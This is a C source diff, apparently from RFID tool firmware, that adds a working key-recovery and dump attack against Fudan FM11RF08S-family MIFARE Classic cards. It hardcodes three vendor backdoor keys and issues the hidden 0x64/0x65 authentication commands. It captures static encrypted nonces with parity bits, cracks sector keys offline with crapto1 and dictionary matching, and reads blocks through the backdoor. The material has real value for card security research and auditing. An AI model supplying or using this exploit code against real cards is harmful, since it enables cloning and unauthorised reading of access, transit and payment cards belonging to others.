@@ -211,6 +211,13 @@ u32 mfUnpack(const u8 *raw, u32 rawLen, u32 off, u8 *out, u32 n)
 	return i;
 }
 
+// Parity bit of the i-th 9-bit group (raw received parity, encrypted under Crypto1)
+static u8 unpackPar(const u8 *raw, u32 off, u32 i)
+{
+	u32 bit = off + 9 * i + 8;
+	return (raw[bit / 8] >> (bit % 8)) & 1;
+}
+
 // Parity-off TX of bytes with the given parity bits; the answer's bit stream starts where ours ended.
 static int ptx(const u8 *data, u32 len, const u8 *par, MonFrame *ans, u32 *rxOff)
 {
@@ -221,10 +228,18 @@ static int ptx(const u8 *data, u32 len, const u8 *par, MonFrame *ans, u32 *rxOff
 	return r;
 }
 
+static int authCmd(u8 authc, u8 block, const u8 key[6], Crypto1 *c);
+
 int mfAuth(u8 block, const u8 key[6], bool keyB, Crypto1 *c)
 {
+	return authCmd(keyB ? 0x61 : 0x60, block, key, c);
+}
+
+// mfAuth with the raw AUTH command byte (0x64/0x65 = the FM11RF08S backdoor variants)
+static int authCmd(u8 authc, u8 block, const u8 key[6], Crypto1 *c)
+{
 	MonFrame f[4];
-	u8 cmd[4] = { keyB ? 0x61 : 0x60, block }, raw[8], code;
+	u8 cmd[4] = { authc, block }, raw[8], code;
 	if (!iso14aParity(true)) FAIL(-1, "parity on");
 	int sak = iso14aSelect();
 	if (sak == -2) FAIL(-1, "select: monitor");
@@ -278,12 +293,13 @@ int mfReadBlock(Crypto1 *c, u8 block, u8 out[16])
 
 #define NESTED_DIST 160 // on-chip OP_NESTED gives this fixed PRNG distance nt0 -> nt_T (NOTES.md)
 
-// One nested nonce: select, then auth1 (known key) + the nested target AUTH on-chip at fixed timing.
-// Reads nt0 (known auth nonce) and the encrypted nested nonce. 1 ok, 0 no answer, -1 monitor error.
-static int nestedNonce(u8 kb, const u8 key[6], bool knownB, u8 tb, bool tgtB, u32 *nt0, u32 *encNt)
+// One nested nonce: select, then auth1 (known key, raw AUTH command ac) + the nested AUTH (raw command
+// nc0) on-chip at fixed timing. Reads nt0 (known auth nonce), the encrypted nested nonce and its 4 raw
+// parity bits (bit 3 = first byte). 1 ok, 0 no answer, -1 monitor error.
+static int nestedCapture(u8 ac, u8 kb, const u8 key[6], u8 nc0, u8 tb, u32 *nt0, u32 *encNt, u8 *par)
 {
 	MonFrame f[4];
-	u8 a1[4] = { knownB ? 0x61 : 0x60, kb }, frame[8], code, nc[4] = { tgtB ? 0x61 : 0x60, tb };
+	u8 a1[4] = { ac, kb }, frame[8], code, nc[4] = { nc0, tb };
 	crcA(a1, 2, a1 + 2);
 	crcA(nc, 2, nc + 2);
 	u32 flen = mfPack(a1, 4, NULL, frame, &code);
@@ -300,7 +316,78 @@ static int nestedNonce(u8 kb, const u8 key[6], bool knownB, u8 tb, bool tgtB, u3
 	u8 b[4];
 	if (mfUnpack(f[n - 1].data, f[n - 1].len, 4, b, 4) != 4) FAIL(0, "short nonce");
 	*encNt = b[0] << 24 | b[1] << 16 | b[2] << 8 | b[3];
+	if (par) {
+		*par = 0;
+		for (int i = 0; i < 4; i++) *par = *par << 1 | unpackPar(f[n - 1].data, 4, i);
+	}
 	return 1;
+}
+
+static int nestedNonce(u8 kb, const u8 key[6], bool knownB, u8 tb, bool tgtB, u32 *nt0, u32 *encNt)
+{
+	return nestedCapture(knownB ? 0x61 : 0x60, kb, key, tgtB ? 0x61 : 0x60, tb, nt0, encNt, NULL);
+}
+
+static u64 key48(const u8 key[6])
+{
+	u64 k = 0;
+	for (int i = 0; i < 6; i++) k = k << 8 | key[i];
+	return k;
+}
+
+static void keyBytes(u64 k, u8 key[6])
+{
+	for (int i = 0; i < 6; i++) key[i] = k >> (40 - 8 * i);
+}
+
+static u32 cardUid(void)
+{
+	return card.uid[0] << 24 | card.uid[1] << 16 | card.uid[2] << 8 | card.uid[3];
+}
+
+const u8 mfBackdoorKeys[][6] = {
+	{ 0xA3, 0x96, 0xEF, 0xA4, 0xE2, 0x4F }, // FM11RF08S
+	{ 0xA3, 0x16, 0x67, 0xA8, 0xCE, 0xC1 }, // FM11RF08 (and some *98)
+	{ 0x51, 0x8B, 0x33, 0x54, 0xE7, 0x60 }, // FM11RF32N
+};
+const int mfNumBackdoorKeys = sizeof(mfBackdoorKeys) / sizeof(mfBackdoorKeys[0]);
+
+int mfBackdoorKey(u8 keyOut[6])
+{
+	for (int i = 0; i < mfNumBackdoorKeys; i++) {
+		Crypto1 c;
+		for (int t = 0; t < 2; t++) { // the static-nonce cards flake on a cold auth
+			int r = authCmd(0x64, 0, mfBackdoorKeys[i], &c);
+			if (r < 0) return -1;
+			if (r) {
+				memcpy(keyOut, mfBackdoorKeys[i], 6);
+				return 1;
+			}
+		}
+	}
+	FAIL(0, "no backdoor");
+}
+
+int mfStaticNonce(u8 block, bool keyB, const u8 bdKey[6], MfStatic *st)
+{
+	u32 nt0, enc;
+	u8 bd = keyB ? 0x65 : 0x64, nr = keyB ? 0x61 : 0x60;
+	int r = 0;
+	// 1: nested with the backdoor command -> the static nonce under the backdoor key -> clear nt
+	for (int t = 0; t < 4 && r != 1; t++)
+		if ((r = nestedCapture(bd, block, bdKey, bd, block, &nt0, &enc, NULL)) < 0) return -1;
+	if (r != 1) return 0;
+	st->nt = crapto1_nt_decrypt(key48(bdKey), cardUid(), enc);
+	// 2: nested with the normal command -> the same nonce under the real key, with its parity
+	r = 0;
+	for (int t = 0; t < 4 && r != 1; t++)
+		if ((r = nestedCapture(bd, block, bdKey, nr, block, &nt0, &st->ntEnc, &st->par)) < 0) return -1;
+	return r;
+}
+
+bool mfStaticMatch(const MfStatic *st, const u8 key[6])
+{
+	return crapto1_nt_decrypt(key48(key), cardUid(), st->ntEnc) == st->nt;
 }
 
 int mfNestedRecover(u8 kb, const u8 key[6], bool knownB, u8 tb, bool tgtB, u8 keyOut[6])
@@ -500,6 +587,87 @@ static int readSector(MfDump *d, int sec, const u8 key[6], bool kb)
 
 static int addKey(u8 (*out)[6], int n, int max, const u8 *key);
 
+// readSector for a key that already fits offline: a refusal is the static-nonce card's cold-auth flake
+static int readSectorRetry(MfDump *d, int sec, const u8 key[6], bool kb)
+{
+	for (int t = 0; t < 3; t++) {
+		int r = readSector(d, sec, key, kb);
+		if (r) return r;
+	}
+	return 0;
+}
+
+// FM11RF08S family (NOTES.md): with a backdoor key, collect every sector's static nonce and solve
+// keys offline -- dictionary keys and reuse are checked against the nonces with no RF traffic, and
+// only matches cost an auth. A candidate of one cell that fits another cell is a reused key. Keys used
+// by a single cell stay open (tens of thousands of candidates: too many to try over RF). Sets
+// done[][] for the cells it covered; returns -1 on a monitor error.
+static int staticPass(MfDump *d, int sectors, u8 (*dict)[6], int *ndict, bool done[40][2])
+{
+	u8 bd[6];
+	int r = mfBackdoorKey(bd);
+	if (r <= 0) return r;
+	logp("backdoor key %02X%02X%02X%02X%02X%02X: static nonce attack\n",
+		bd[0], bd[1], bd[2], bd[3], bd[4], bd[5]);
+	static MfStatic st[40][2];
+	static u64 cand[1 << 18];
+	bool expanded[40][2] = { 0 };
+	u32 uid = cardUid();
+	for (int sec = 0; sec < sectors; sec++)
+		for (int kb = 0; kb < 2; kb++) {
+			if ((r = mfStaticNonce(mfFirstBlock(sec), kb, bd, &st[sec][kb])) < 0) return -1;
+			done[sec][kb] = r == 1;
+		}
+#define OPEN(s, k) (done[s][k] && !d->keyFound[s][k])
+	bool progress = true;
+	while (progress) {
+		progress = false;
+		for (int sec = 0; sec < sectors; sec++)
+			for (int kb = 0; kb < 2; kb++)
+				for (int k = 0; k < *ndict && OPEN(sec, kb); k++)
+					if (mfStaticMatch(&st[sec][kb], dict[k]) && readSectorRetry(d, sec, dict[k], kb) < 0)
+						return -1;
+		for (int sec = 0; sec < sectors && !progress; sec++)
+			for (int kb = 0; kb < 2 && !progress; kb++) {
+				if (!OPEN(sec, kb) || expanded[sec][kb]) continue;
+				expanded[sec][kb] = true;
+				MfStatic *s = &st[sec][kb];
+				int n = crapto1_static(uid, s->nt, s->ntEnc, s->par, cand, 1 << 18);
+				logp("sector %2d %c: %d candidates\n", sec, kb ? 'B' : 'A', n);
+				for (int i = 0; i < n && !progress; i++)
+					for (int os = 0; os < sectors && !progress; os++)
+						for (int ok = 0; ok < 2; ok++) {
+							if ((os == sec && ok == kb) || !OPEN(os, ok)) continue;
+							if (crapto1_nt_decrypt(cand[i], uid, st[os][ok].ntEnc) != st[os][ok].nt)
+								continue;
+							u8 key[6];
+							keyBytes(cand[i], key);
+							logp("  reused key %02X%02X%02X%02X%02X%02X (sector %d %c)\n", key[0], key[1],
+								key[2], key[3], key[4], key[5], os, ok ? 'B' : 'A');
+							*ndict = addKey(dict, *ndict, MF_MAX_KEYS, key);
+							progress = true; // back to the dictionary step, which applies it everywhere
+							break;
+						}
+			}
+	}
+	for (int sec = 0; sec < sectors; sec++)
+		for (int kb = 0; kb < 2; kb++)
+			if (OPEN(sec, kb)) logp("sector %2d %c: key used only here, not recovered\n", sec, kb ? 'B' : 'A');
+#undef OPEN
+	// The backdoor also reads data: fill in blocks no recovered key could read.
+	for (int sec = 0; sec < sectors; sec++) {
+		int b0 = mfFirstBlock(sec), nb = mfSectorBlocks(sec);
+		if (sectorValid(d, sec) == nb) continue;
+		Crypto1 c;
+		r = 0;
+		for (int t = 0; t < 3 && !r; t++)
+			if ((r = authCmd(0x64, b0, bd, &c)) < 0) return -1;
+		for (int i = 0; r && i < nb; i++)
+			if (!d->valid[b0 + i] && mfReadBlock(&c, b0 + i, d->data[b0 + i]) > 0) d->valid[b0 + i] = true;
+	}
+	return 1;
+}
+
 int mfDumpCard(MfDump *d, int sectors, const u8 (*keys)[6], int nkeys)
 {
 	memset(d, 0, sizeof(*d));
@@ -513,6 +681,10 @@ int mfDumpCard(MfDump *d, int sectors, const u8 (*keys)[6], int nkeys)
 	int tried[40][2] = { 0 }; // dict entries already attempted per cell (so each is tried once)
 	int pivotSec = -1; bool pivotB = false; // first confirmed key, used as the nested known key
 
+	// Static-nonce cards: the backdoor solves what it can; plain nested can't work on those cells.
+	bool staticDone[40][2] = { 0 };
+	if (staticPass(d, sectors, dict, &ndict, staticDone) < 0) return -1;
+
 	// Sweep until a full pass turns up nothing new: recover EVERY missing A/B key, folding each
 	// one back into the dictionary so later sectors can reuse it before falling back to nested.
 	bool progress = true;
@@ -520,7 +692,7 @@ int mfDumpCard(MfDump *d, int sectors, const u8 (*keys)[6], int nkeys)
 		progress = false;
 		for (int sec = 0; sec < sectors; sec++)
 			for (int kb = 0; kb < 2; kb++) {
-				if (d->keyFound[sec][kb]) continue;
+				if (d->keyFound[sec][kb] || staticDone[sec][kb]) continue;
 				for (int k = tried[sec][kb]; k < ndict && !d->keyFound[sec][kb]; k++)
 					if (readSector(d, sec, dict[k], kb) < 0) return -1;
 				tried[sec][kb] = ndict;
